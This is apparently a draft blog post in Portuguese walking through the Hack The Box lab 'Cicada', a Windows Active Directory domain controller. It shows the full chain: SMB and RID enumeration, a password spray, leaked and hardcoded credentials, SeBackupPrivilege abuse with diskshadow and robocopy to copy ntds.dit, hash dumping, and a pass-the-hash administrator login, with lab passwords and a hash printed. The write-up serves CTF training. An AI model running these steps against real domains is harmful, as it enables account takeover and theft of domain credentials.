+++
title = 'Cicada'
date = 2024-01-14T07:07:07+01:00
draft = true
+++


# Cicada

{{<figure src="/assets/image (188).png" alt="">}}

### Recon

Nessa máquina começamos sabendo o IP `10.10.11.35`. Com isso em mão, podemos começar a mapear os serviços que executam nesse IP com o NMAP:

```bash
# Nmap 7.94SVN scan initiated Mon Oct 14 18:47:32 2024 as: /usr/lib/nmap/nmap --privileged -A -oA nmap/cicada -p- --min-rate=100000 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.18s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-15 05:47:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
56871/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-15T05:48:47
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   213.87 ms 10.10.14.1
2   217.76 ms 10.10.11.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 14 18:49:26 2024 -- 1 IP address (1 host up) scanned in 114.01 seconds

```

Podemos notar um ambiente Windows com Active Directory e SMB.&#x20;

#### SMB

Começo enumerando o SMB na tentativa de conseguir acesso a arquivos e pastas sem autenticação no sistema:

```bash
➜  nxc smb 10.10.11.35 --shares


SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domai
n:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] IndexError: list index out of range
SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜ nxc smb 10.10.11.35 -u "guest" -p  "" --shares


SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domai
n:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

É possível notar o diretório HR disponível para leitura, podemos ver os documentos dentro e possivelmente ler o conteúdo:

```bash
➜  smbclient //10.10.11.35/HR
Password for [WORKGROUP\art]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 397148 blocks available
smb: \> get Notice from HR.txt .
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice
smb: \> get Notice from HR.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> ^C
➜  ls
'Notice from HR.txt'
```

O conteúdo desse documento informa uma senha padrão para os funcionários, e sugere que seja trocada após o primeiro login:<br>

{{<figure src="/assets/image (190).png" alt="">}}

Agora temos uma possível senha para algum usuário, mas ainda não sabemos nenhum usuário do sistema, podemos usar a técnica de `brute-rid` para ver possíveis usuários do sistema e validar com o Kerberos.

```bash
➜  nxc smb 10.10.11.35  -u "guest" -p "" --rid-brute


SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Com isso podemos montar uma wordlist com os usuários e validar o login usando o Kerbrute

```bash
➜ cat creds.txt
Administrator
Guest
krbtgt
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
➜ kerbrute userenum -d cicada.htb --dc 10.10.11.35 creds.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/15/25 - Ronnie Flathers @ropnop

2025/02/15 18:28:55 >  Using KDC(s):
2025/02/15 18:28:55 >   10.10.11.35:88

2025/02/15 18:28:55 >  [+] VALID USERNAME:       john.smoulder@cicada.htb
2025/02/15 18:28:55 >  [+] VALID USERNAME:       sarah.dantelia@cicada.htb
2025/02/15 18:28:55 >  [+] VALID USERNAME:       Administrator@cicada.htb
2025/02/15 18:28:55 >  [+] VALID USERNAME:       Guest@cicada.htb
2025/02/15 18:28:55 >  [+] VALID USERNAME:       david.orelious@cicada.htb
2025/02/15 18:28:55 >  [+] VALID USERNAME:       emily.oscars@cicada.htb
2025/02/15 18:28:55 >  [+] VALID USERNAME:       michael.wrightson@cicada.htb
2025/02/15 18:28:55 >  Done! Tested 8 usernames (7 valid) in 0.207 seconds
```

Agora temos uma senha e uma lista de usuários do sistema, no contexto atual o que podemos fazer é testar se algum desses usuários utiliza essa senha fazendo um `password spray`:

```bash
➜  nxc smb 10.10.11.35  -u creds.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success


SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

Conseguimos uma credencial `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8` .

Podemos testar os acessos dele no SMB também e ver se temos algo diferente lá, porém ele não tem acesso a nenhum diretório diferente de antes.&#x20;

Tento essas credenciais para realizar login na máquina, com o `evil-winrm`, porém sem sucesso:

```bash
➜ evil-winrm -u michael.wrightson  -p 'Cicada$M6Corpb*@Lp#nZp!8' -i 10.10.11.35
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimpleme
nted on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completi
on

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```



Podemos tentar enumerar outros usuários com esse acesso:

```bash
➜  nxc smb 10.10.11.35  -u "michael.wrightson" -p 'Cicada$M6Corpb*@Lp#nZp!8' --users

  SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC
) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Desc
ription-
SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built
-in account for administering the computer/domain
SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 2       Built
-in account for guest access to the computer/domain
SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key D
istribution Center Service Account
SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2
SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2
SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 2       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 2
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

Na descrição de `david.orelious` a senha é vazada: `aRt$Lp#7t*VQ!3`.

Tento novamente um login via `evil-winrm`, porém sem sucesso também.

Com esse acesso temos acesso a um novo diretório no SMB:

```bash
➜ nxc smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domai
n:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

Nesse diretório DEV temos um script de backup para windows, quando baixamos e vemos o código fonte, vemos a credencial de outro usuário gravada no código e conseguimos um novo acesos, `emily.oscars:Q!3@Lp#M6b*7t*Vt`:

```bash
➜ smbclient //10.10.11.35/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 395259 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> ^C
➜ cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

E com essas credenciais, o login via `evil-winrm` finalmente funciona:

```bash
➜ evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimpleme
nted on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completi
on

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```



{{<figure src="/assets/image (191).png" alt="">}}

### **Privilege Escalation**

Na shell como `emily.oscars`, a primeira coisa que faço é verificar as permissões dentro da máquina com o comando `whoami /priv`:&#x20;

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

Pesquisando sobre esses privilégios, encontro documentos que demonstrar como é possível escalar privilégios usando dessas permissões.

Criamos um arquivo qualquer com as instruções:

```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

{{<figure src="/assets/image (192).png" alt="">}}

Importamos o arquivo para o servidor:

{{<figure src="/assets/image (193).png" alt="">}}

```bash
*Evil-WinRM* PS C:\Temp> upload /home/art/Projects/CTF/htb/season-6/cicada/docs/file.abc

Info: Uploading /home/art/Projects/CTF/htb/season-6/cicada/docs/file.abc to C:\Temp\file.abc

Data: 112 bytes of 112 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Temp> ls


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/16/2025  12:29 PM             84 file.abc
-a----         2/16/2025   6:19 AM          49152 sam.hive
-a----         2/16/2025   6:19 AM       18518016 system.hive


*Evil-WinRM* PS C:\Temp>
```



Usamos agora o `diskshadow` para executar as instruções no arquivo que subimos, onde ele vai criar um disco virtual Z que é um clone do disco C:

{{<figure src="/assets/image (195).png" alt="">}}

Agora usamos o `robocopy` para copiar os arquivos do Disco virtual para o nosso diretório com `robocopy /b z:\windows\ntds . ntds.dit`:<br>

{{<figure src="/assets/image (196).png" alt="">}}

Com um comando de `reg save` conseguimos extrair o system de dentro do `ntds.dit`, e baixamos os arquivos para nossa máquina :

{{<figure src="/assets/image (197).png" alt="">}}

Com o system hive e o `ntds.dit` em mãos, podemos usar o `secretsdump` do framework `impacket` e extrair as hashes desse arquivo:

{{<figure src="/assets/image (198).png" alt="">}}

Agora com a Hash do administrador, podemos logar com esse acesso usando `Pass the Hash` e conseguir acesso administrativo no servidor:

```bash
➜ evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.10.11.35

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```



{{<figure src="/assets/image (199).png" alt="">}}

E com isso podemos pegar a flag de root e terminar o laboratório.

{{<figure src="/assets/image (200).png" alt="">}}
